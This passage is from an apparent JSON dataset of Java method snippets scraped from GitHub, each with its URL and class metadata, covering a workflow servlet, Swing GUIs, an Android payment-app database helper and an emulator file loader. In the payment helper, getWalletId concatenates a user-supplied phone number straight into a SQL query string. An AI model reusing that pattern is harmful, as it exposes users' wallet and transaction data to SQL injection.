pmap.put(\"lastModifiedUser\",project.getLastModifiedUser());\n      pmap.put(\"lastModifiedTimestamp\", webUtils.formatDateTime(project.getLastModifiedTimestamp()));\n      // \u9875\u9762\u5220\u9664\u6309\u94ae\u663e\u793a\u5224\u65ad\n      if(isAdmin || hasPermission(project, user, Permission.Type.ADMIN)\n          || hasPermission(project, user, Type.DEPMAINTAINER)){\n        pmap.put(\"showDeleteBtn\", \"true\");\n      }\n      projectMapList.add(pmap);\n    }\n\n    ret.put(\"total\", total);\n    ret.put(\"from\", start);\n    ret.put(\"length\", pageSize);\n    ret.put(\"projectList\", projectMapList);\n\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32041, "method_name": "getProjectId", "class_name": "SimplifiedProject", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getProjectId() {\n      return this.projectId;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"id": 32042, "method_name": "setProjectId", "class_name": "SimplifiedProject", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setProjectId(final int projectId) {\n      this.projectId = projectId;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"id": 32043, "method_name": "getProjectName", "class_name": "SimplifiedProject", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getProjectName() {\n      return this.projectName;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"id": 32044, "method_name": "setProjectName", "class_name": "SimplifiedProject", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setProjectName(final String projectName) {\n      this.projectName = projectName;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"id": 32045, "method_name": "getCreatedBy", "class_name": "SimplifiedProject", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCreatedBy() {\n      return this.createdBy;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"id": 32046, "method_name": "setCreatedBy", "class_name": "SimplifiedProject", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreatedBy(final String createdBy) {\n      this.createdBy = createdBy;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"id": 32047, "method_name": "getCreatedTime", "class_name": "SimplifiedProject", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getCreatedTime() {\n      return this.createdTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"id": 32048, "method_name": "setCreatedTime", "class_name": "SimplifiedProject", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreatedTime(final long createdTime) {\n      this.createdTime = createdTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"id": 32049, "method_name": "getUserPermissions", "class_name": "SimplifiedProject", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Pair>", "snippet": "    public List<Pair<String, Permission>> getUserPermissions() {\n      return this.userPermissions;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"id": 32050, "method_name": "setUserPermissions", "class_name": "SimplifiedProject", "params": ["List<Pair>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUserPermissions(\n        final List<Pair<String, Permission>> userPermissions) {\n      this.userPermissions = userPermissions;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"id": 32051, "method_name": "getGroupPermissions", "class_name": "SimplifiedProject", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Pair>", "snippet": "    public List<Pair<String, Permission>> getGroupPermissions() {\n      return this.groupPermissions;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"id": 32052, "method_name": "setGroupPermissions", "class_name": "SimplifiedProject", "params": ["List<Pair>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setGroupPermissions(\n        final List<Pair<String, Permission>> groupPermissions) {\n      this.groupPermissions = groupPermissions;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"id": 32053, "method_name": "actionPerformed", "class_name": "DirectorPanel", "params": ["ActionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void actionPerformed(ActionEvent e) {\n\t\tif (e.getSource() == findResult) {\n\n\t\t\tresults.setText(\"Collecting results, please wait...\");\n\t\t\tThread t = new Thread() {\n\t\t\t\t@Override\n\t\t\t\tpublic void run() {\n\n\t\t\t\t\tString return_val = \"\";\n\n\t\t\t\t\t// Validate year range input\n\t\t\t\t\tif (minYearInput.getText().trim().equals(\"\") || maxYearInput.getText().trim().equals(\"\")) {\n\t\t\t\t\t\tresults.setText(\"Must provide valid year range for search!\");\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\n\t\t\t\t\t// Collect user input before starting search\n\t\t\t\t\tInteger firstYear = Integer.parseInt(minYearInput.getText());\n\t\t\t\t\tInteger lastYear = Integer.parseInt(maxYearInput.getText());\n\n\t\t\t\t\tBoolean actor = false;\n\t\t\t\t\tif (professionInput.getItemAt(professionInput.getSelectedIndex()).equals(\"Actor\"))\n\t\t\t\t\t\tactor = true;\n\t\t\t\t\telse if (professionInput.getItemAt(professionInput.getSelectedIndex()).equals(\"\")) {\n\t\t\t\t\t\tresults.setText(\"Must select an occupation from the drop down!\");\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\n\t\t\t\t\t// Search for all the links between actors or directors in the database in the\n\t\t\t\t\t// given year range\n\t\t\t\t\tSystem.out.println(\"Getting links for year range\");\n\t\t\t\t\tArrayList<PersonTitleLink> links = manager.getPeopleTitlesByYear(actor, firstYear, lastYear);\n\t\t\t\t\tSystem.out.println(\"Links recieved\");\n\n\t\t\t\t\tArrayList<PersonTitleLink> linksToReturn = new ArrayList<PersonTitleLink>();\n\t\t\t\t\tInteger numYears = lastYear - firstYear + 1;\n\n\t\t\t\t\t// Search through all the links that were found\n\t\t\t\t\tInteger index = 0;\n\t\t\t\t\twhile (index < links.size()) {\n\t\t\t\t\t\tSystem.out.println(\"\\nFound person\\n\");\n\t\t\t\t\t\tInteger prevYear = -1;\n\t\t\t\t\t\tArrayList<PersonTitleLink> tempLinks = new ArrayList<PersonTitleLink>();\n\t\t\t\t\t\tString person = links.get(index).getPersonID();\n\t\t\t\t\t\tInteger counter = 0;\n\n\t\t\t\t\t\t// Continue looping through the results while the person is the same,\n\t\t\t\t\t\t// incrementing a counter every time the year changes (this is\n\t\t\t\t\t\t// alright because the results are sorted by people and years)\n\t\t\t\t\t\twhile (index < links.size() && person.equals(links.get(index).getPersonID())) {\n\t\t\t\t\t\t\tif (links.get(index).getYear() != prevYear) {\n\t\t\t\t\t\t\t\tSystem.out.println(\"Found new title for person\");\n\t\t\t\t\t\t\t\ttempLinks.add(links.get(index));\n\t\t\t\t\t\t\t\tcounter++;\n\t\t\t\t\t\t\t\tprevYear = links.get(index).getYear();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tindex++;\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t// If the counter for the person is the same as the number of distinct years,\n\t\t\t\t\t\t// add the person\n\t\t\t\t\t\tif (counter == numYears) {\n\t\t\t\t\t\t\tSystem.out.println(\"Adding all unique title links for person\");\n\t\t\t\t\t\t\tlinksToReturn.addAll(tempLinks);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t\tindex = 0;\n\t\t\t\t\t// Generate string for results and find the title names of all the relevant\n\t\t\t\t\t// titles\n\t\t\t\t\twhile (index < linksToReturn.size()) {\n\t\t\t\t\t\tSystem.out.println(\"Generating string for person \" + (index + 1));\n\t\t\t\t\t\tPerson person = manager.getPersonByID(linksToReturn.get(index).getPersonID());\n\t\t\t\t\t\tif (!person.getName().toLowerCase().trim()\n\t\t\t\t\t\t\t\t.equals(excludePerson.getText().toLowerCase().trim())) {\n\t\t\t\t\t\t\treturn_val += person.getName() + \"\\n\";\n\n\t\t\t\t\t\t\twhile (index < linksToReturn.size()\n\t\t\t\t\t\t\t\t\t&& person.getPersonID().equals(linksToReturn.get(index).getPersonID())) {\n\t\t\t\t\t\t\t\tTitle title = manager.getTitleByID(linksToReturn.get(index).getTitleID());\n\t\t\t\t\t\t\t\treturn_val += \"\\t\" + title.getTitle() + \" (\" + title.getStartYear() + \")\\n\";\n\t\t\t\t\t\t\t\tindex++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\twhile (index < linksToReturn.size()\n\t\t\t\t\t\t\t\t\t&& person.getPersonID().equals(linksToReturn.get(index).getPersonID())) {\n\t\t\t\t\t\t\t\tindex++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\treturn_val += \"\\n\";\n\t\t\t\t\t}\n\n\t\t\t\t\t// Display the results to the console and the window\n\t\t\t\t\tSystem.out.println(\"Final Results:\\n\\n\" + return_val);\n\t\t\t\t\tresults.setText(return_val);\n\t\t\t\t}\n\t\t\t};\n\t\t\tt.start();\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Luke-Grammer/IMDB-Database-Application/master/src/UI/DirectorPanel.java", "stars": "1", "class_props": {"extends": "JPanel", "implements": ["ActionListener"], "modifiers": ["public"]}}, {"id": 32054, "method_name": "main", "class_name": "SampleJUnitJupiterApplication", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(SampleJUnitJupiterApplication.class, args);\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-junit-jupiter/src/main/java/smoketest/SampleJUnitJupiterApplication.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32055, "method_name": "onCreate", "class_name": "DBHelper", "params": ["SQLiteDatabase"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(SQLiteDatabase db) {\n        // TODO Auto-generated method stub\n        db.execSQL(\n                \"create table transact \" +\n                        \"(id integer primary key, sender text,receiver text,amount text)\"\n        );\n        db.execSQL(\n                \"create table wallet \" +\n                        \"(id integer primary key, number text,cash text)\"\n        );\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/DBHelper.java", "stars": "1", "class_props": {"extends": "SQLiteOpenHelper", "implements": null, "modifiers": ["public"]}}, {"id": 32056, "method_name": "onUpgrade", "class_name": "DBHelper", "params": ["SQLiteDatabase", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {\n        // TODO Auto-generated method stub\n        db.execSQL(\"DROP TABLE IF EXISTS transact\");\n        db.execSQL(\"DROP TABLE IF EXISTS wallet\");\n        onCreate(db);\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/DBHelper.java", "stars": "1", "class_props": {"extends": "SQLiteOpenHelper", "implements": null, "modifiers": ["public"]}}, {"id": 32057, "method_name": "insertContact", "class_name": "DBHelper", "params": ["String", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean insertContact (String sender, String receiver, String amount) {\n        SQLiteDatabase db = this.getWritableDatabase();\n        ContentValues contentValues = new ContentValues();\n        contentValues.put(\"sender\", sender);\n        contentValues.put(\"receiver\", receiver);\n        contentValues.put(\"amount\", amount);\n        db.insert(\"transact\", null, contentValues);\n        return true;\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/DBHelper.java", "stars": "1", "class_props": {"extends": "SQLiteOpenHelper", "implements": null, "modifiers": ["public"]}}, {"id": 32058, "method_name": "insertWallet", "class_name": "DBHelper", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean insertWallet (String number, String cash) {\n        SQLiteDatabase db = this.getWritableDatabase();\n        ContentValues contentValues = new ContentValues();\n        contentValues.put(\"number\", number);\n        contentValues.put(\"cash\", cash);\n        db.insert(\"wallet\", null, contentValues);\n        return true;\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/DBHelper.java", "stars": "1", "class_props": {"extends": "SQLiteOpenHelper", "implements": null, "modifiers": ["public"]}}, {"id": 32059, "method_name": "getTransData", "class_name": "DBHelper", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Cursor", "snippet": "    public Cursor getTransData(int id) {\n        SQLiteDatabase db = this.getReadableDatabase();\n        Cursor res =  db.rawQuery( \"select * from transact where id=\"+id+\"\", null );\n        return res;\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/DBHelper.java", "stars": "1", "class_props": {"extends": "SQLiteOpenHelper", "implements": null, "modifiers": ["public"]}}, {"id": 32060, "method_name": "getWalletData", "class_name": "DBHelper", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Cursor", "snippet": "    public Cursor getWalletData(int id) {\n        SQLiteDatabase db = this.getReadableDatabase();\n        Cursor res =  db.rawQuery( \"select * from wallet where id=\"+id+\"\", null );\n        return res;\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/DBHelper.java", "stars": "1", "class_props": {"extends": "SQLiteOpenHelper", "implements": null, "modifiers": ["public"]}}, {"id": 32061, "method_name": "getWalletId", "class_name": "DBHelper", "params": ["String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "int", "snippet": "    public int getWalletId(String  number) throws SQLException\n    {\n        SQLiteDatabase db = this.getReadableDatabase();\n        long recc=0;\n        String rec=null;\n        Cursor mCursor = db.rawQuery(\n                \"SELECT id  FROM  wallet WHERE number= '\"+number+\"'\" , null);\n        if (mCursor != null)\n        {\n            mCursor.moveToFirst();\n            recc=mCursor.getLong(0);\n            rec=String.valueOf(recc);\n        }\n        return Integer.parseInt(rec);\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/DBHelper.java", "stars": "1", "class_props": {"extends": "SQLiteOpenHelper", "implements": null, "modifiers": ["public"]}}, {"id": 32062, "method_name": "isPhonePresent", "class_name": "DBHelper", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isPhonePresent(String phone) {\n        ArrayList arrayList = getAllWallets();\n        for(int i=0;i<arrayList.size();i+=2)\n            if(arrayList.get(i).equals(phone))\n                return true;\n\n        return false;\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/DBHelper.java", "stars": "1", "class_props": {"extends": "SQLiteOpenHelper", "implements": null, "modifiers": ["public"]}}, {"id": 32063, "method_name": "updateWallet", "class_name": "DBHelper", "params": ["Integer", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean updateWallet (Integer id, String number, String cash) {\n        SQLiteDatabase db = this.getWritableDatabase();\n        ContentValues contentValues = new ContentValues();\n        contentValues.put(\"number\", number);\n        contentValues.put(\"cash\", cash);\n        db.update(\"wallet\", contentValues, \"id = ? \", new String[] { Integer.toString(id) } );\n        return true;\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/DBHelper.java", "stars": "1", "class_props": {"extends": "SQLiteOpenHelper", "implements": null, "modifiers": ["public"]}}, {"id": 32064, "method_name": "deleteTrans", "class_name": "DBHelper", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer deleteTrans (Integer id) {\n        SQLiteDatabase db = this.getWritableDatabase();\n        return db.delete(\"transact\",\n                \"id = ? \",\n                new String[] { Integer.toString(id) });\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/DBHelper.java", "stars": "1", "class_props": {"extends": "SQLiteOpenHelper", "implements": null, "modifiers": ["public"]}}, {"id": 32065, "method_name": "deleteWallet", "class_name": "DBHelper", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer deleteWallet (Integer id) {\n        SQLiteDatabase db = this.getWritableDatabase();\n        return db.delete(\"wallet\",\n                \"id = ? \",\n                new String[] { Integer.toString(id) });\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/DBHelper.java", "stars": "1", "class_props": {"extends": "SQLiteOpenHelper", "implements": null, "modifiers": ["public"]}}, {"id": 32066, "method_name": "getAllTransactions", "class_name": "DBHelper", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<String>", "snippet": "    public ArrayList<String> getAllTransactions() {\n        ArrayList<String> array_list = new ArrayList<String>();\n\n        //hp = new HashMap();\n        SQLiteDatabase db = this.getReadableDatabase();\n        Cursor res =  db.rawQuery( \"select * from transact\", null );\n        res.moveToFirst();\n\n        while(res.isAfterLast() == false){\n            array_list.add(res.getString(res.getColumnIndex(TRANS_COLUMN_SENDER)));\n            array_list.add(res.getString(res.getColumnIndex(TRANS_COLUMN_RECEIVER)));\n            array_list.add(res.getString(res.getColumnIndex(TRANS_COLUMN_AMOUNT)));\n            res.moveToNext();\n        }\n        return array_list;\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/DBHelper.java", "stars": "1", "class_props": {"extends": "SQLiteOpenHelper", "implements": null, "modifiers": ["public"]}}, {"id": 32067, "method_name": "getAllWallets", "class_name": "DBHelper", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<String>", "snippet": "    public ArrayList<String> getAllWallets() {\n        ArrayList<String> array_list = new ArrayList<String>();\n\n        //hp = new HashMap();\n        SQLiteDatabase db = this.getReadableDatabase();\n        Cursor res =  db.rawQuery( \"select * from wallet\", null );\n        res.moveToFirst();\n\n        while(res.isAfterLast() == false){\n            array_list.add(res.getString(res.getColumnIndex(WALLET_COLUMN_NUMBER)));\n            array_list.add(res.getString(res.getColumnIndex(WALLET_COLUMN_CASH)));\n            res.moveToNext();\n        }\n        return array_list;\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/DBHelper.java", "stars": "1", "class_props": {"extends": "SQLiteOpenHelper", "implements": null, "modifiers": ["public"]}}, {"id": 32068, "method_name": "onCreate", "class_name": "EndlessListViewActivity", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onCreate(Bundle savedInstanceState)\n\t{\n\t\tsuper.onCreate(savedInstanceState);\n\t\tsetContentView(R.layout.endless);\n\t\tdatasource = Datasource.getInstance();\n\t\tfooterView = ((LayoutInflater) this.getSystemService(Context.LAYOUT_INFLATER_SERVICE)).inflate(R.layout.footer, null, false);\n\t\tgetListView().addFooterView(footerView, null, false);\n\t\tsetListAdapter(new CustomArrayAdapter(this, datasource.getData(0, PAGESIZE)));\n\t\tgetListView().removeFooterView(footerView);\n\n\t\tgetListView().setOnScrollListener(new OnScrollListener()\n\t\t{\n\t\t\t@Override\n\t\t\tpublic void onScrollStateChanged(AbsListView arg0, int arg1)\n\t\t\t{\n\t\t\t\t// nothing here\n\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic void onScroll(AbsListView view, int firstVisibleItem, int visibleItemCount, int totalItemCount)\n\t\t\t{\n\t\t\t\tif (load(firstVisibleItem, visibleItemCount, totalItemCount))\n\t\t\t\t{\n\t\t\t\t\tloading = true;\n\t\t\t\t\tgetListView().addFooterView(footerView, null, false);\n\t\t\t\t\t(new LoadNextPage()).execute(\"\");\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\n\t\tupdateDisplayingTextView();\n\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Paginated%20ListView%20Demo/src/com/danielme/blog/android/paginatedlistview/activities/EndlessListViewActivity.java", "stars": "74", "class_props": {"extends": "AbstractListViewActivity", "implements": null, "modifiers": ["public"]}}, {"id": 32069, "method_name": "load_jr100", "class_name": "DataFile", "params": ["MemorySystem"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "Program", "snippet": "    public abstract Program load_jr100(MemorySystem ms);\n    public abstract void save_jr100(Program p, int version);\n\n    public void setErrorStatus(int status, String message) {\n        this.errorStatus = status;\n        this.errorMessage = message;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/DataFile.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 32070, "method_name": "save_jr100", "class_name": "DataFile", "params": ["Program", "int"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void save_jr100(Program p, int version);\n\n    public void setErrorStatus(int status, String message) {\n        this.errorStatus = status;\n        this.errorMessage = message;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/DataFile.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 32071, "method_name": "setErrorStatus", "class_name": "DataFile", "params": ["int", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setErrorStatus(int status, String message) {\n        this.errorStatus = status;\n        this.errorMessage = message;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/DataFile.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 32072, "method_name": "getErrorStatus", "class_name": "DataFile", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getErrorStatus() {\n        return errorStatus;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/DataFile.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 32073, "method_name": "getErrorMessage", "class_name": "DataFile", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getErrorMessage() {\n        return errorMessage;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/DataFile.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 32074, "method_name": "withMessage", "class_name": "DataFile", "params": ["int", "String"], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "    protected int withMessage(int status, String message) {\n        errorMessage = message;\n        return status;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/DataFile.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 32075, "method_name": "getExtension", "class_name": "DataFile", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getExtension(String filename) {\n        if (filename == null) {\n            return null;\n        }\n        int index = filename.lastIndexOf(\".\");\n        if (index != -1) {\n            return filename.substring(index + 1);\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/DataFile.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 32076, "method_name": "readMagic", "class_name": "DataFile", "params": ["String"], "throws": null, "modifiers": ["private", "static"], "return_type": "byte", "snippet": "    private static byte[] readMagic(String filename) {\n        byte[] magic = new byte[4];\n        try (FileInputStream in = new FileInputStream(filename)) {\n            in.read(magic);\n        }\n        catch (Exception e) {\n            return null;\n        }\n        return magic;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/DataFile.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 32077, "method_name": "isProgFile", "class_name": "DataFile", "params": ["File"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isProgFile(File f) {\n        String ext = getExtension(f.getName());\n        if (ext != null && ext.equals(\"prg\")) {\n            return true;\n        }\n        else {\n            byte[] magic = readMagic(f.getName());\n            if (magic == null) {\n                return false;\n            }\n            if (magic[0] == (byte)0x50 &&   /* 'P' */\n                    magic[1] == (byte)0x52 &&   /* 'R' */\n                    magic[2] == (byte)0x4f &&   /* 'O' */\n                    magic[3] == (byte)0x47) {   /* 'G' */\n                return true;\n            }\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/DataFile.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 32078, "method_name": "isBasicTextFile", "class_name": "DataFile", "params": ["File"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isBasicTextFile(File f) {\n        String ext = getExtension(f.getName());\n        if (ext != null && (ext.equals(\"txt\") || ext.equals(\"bas\"))) {\n            return true;\n        }\n        else {\n            return false;\n        }\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/DataFile.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 32079, "method_name": "initComponents", "class_name": "FoodOrder", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initComponents() {\n\n        jFrame1 = new javax.swing.JFrame();\n        jPanel5 = new javax.swing.JPanel();\n        jPanel6 = new javax.swing.JPanel();\n        jPanel1 = new javax.swing.JPanel();\n        jchkboxSpizza = new javax.swing.JCheckBox();\n        jchkboxMpizza = new javax.swing.JCheckBox();\n        jchkboxLpizza = new javax.swing.JCheckBox();\n        jtxtfieldMeal = new javax.swing.JTextField();\n        jtxtfieldSmall = new javax.swing.JTextField();\n        jtxtfieldMedium = new javax.swing.JTextField();\n        jtxtfieldLarge = new javax.swing.JTextField();\n        jtxtfieldSmallP = new javax.swing.JTextField();\n        jtxtfieldMediumP = new javax.swing.JTextField();\n        jtxtfieldLargeP = new javax.swing.JTextField();\n        jLabel1 = new javax.swing.JLabel();\n        jLabel2 = new javax.swing.JLabel();\n        jPanel2 = new javax.swing.JPanel();\n        jtxtfieldDrink = new javax.swing.JTextField();\n        jchkboxCoca = new javax.swing.JCheckBox();\n        jchkboxThums = new javax.swing.JCheckBox();\n        jchkboxSprite = new javax.swing.JCheckBox();\n        jtxtfieldCoca = new javax.swing.JTextField();\n        jtxtfieldSprite = new javax.swing.JTextField();\n        jtxtfieldThums = new javax.swing.JTextField();\n        jtxtfieldCocaP = new javax.swing.JTextField();\n        jtxtfieldThumsP = new javax.swing.JTextField();\n        jtxtfieldSpriteP = new javax.swing.JTextField();\n        jLabel3 = new javax.swing.JLabel();\n        jLabel4 = new javax.swing.JLabel();\n        jPanel3 = new javax.swing.JPanel();\n        jbtnTotal = new javax.swing.JButton();\n        jbtnOrder = new javax.swing.JButton();\n        jbtnReceipt = new javax.swing.JButton();\n        jbtnReset = new javax.swing.JButton();\n        jbtnExit = new javax.swing.JButton();\n        jPanel4 = new javax.swing.JPanel();\n        jtxtfieldSub = new javax.swing.JTextField();\n        jlableSub = new javax.swing.JLabel();\n        